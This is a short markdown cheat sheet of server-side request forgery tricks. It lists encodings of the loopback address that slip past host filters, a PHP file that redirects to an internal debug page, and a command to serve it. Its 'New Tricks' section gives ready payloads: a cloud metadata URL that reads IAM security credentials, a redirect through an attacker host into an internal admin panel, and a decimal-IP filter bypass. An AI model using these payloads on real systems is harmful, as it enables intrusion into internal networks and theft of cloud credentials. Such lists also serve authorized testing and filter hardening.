- Localhost Address Block: `127.0.0.0 - 127.255.255.255`
- Shortened IP Address: `127.1`
- Prolonged IP Address: `127.000000000000000.1`
- All Zeroes: `0.0.0.0`
- Shortened All Zeroes: `0`
- Decimal Representation: `2130706433`
- Octal Representation: `0177.0000.0000.0001`
- Hex Representation: `0x7f000001`
- IPv6 loopback address: `0:0:0:0:0:0:0:1` (also `::1`)
- IPv4-mapped IPv6 loopback address: `::ffff:127.0.0.1
- localtest.me

Create a php file and host it on server
- ```php
<?php header('Location: http://127.0.0.1/debug'); ?>
```

```
php -S 0.0.0.0:80
```


then direct the url to the server

## New Tricks

### Trick 1
- Scenario: Avatar URL fetch reached cloud metadata internal endpoint.
- Payload: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`

### Trick 2
- Scenario: Webhook validator followed redirect into internal admin panel.
- Payload: `https://attacker.tld/302-to-http://127.0.0.1:8080/admin`

### Trick 3
- Scenario: Bypassed host filter using decimal IPv4 notation.
- Payload: `http://2130706433:80/`
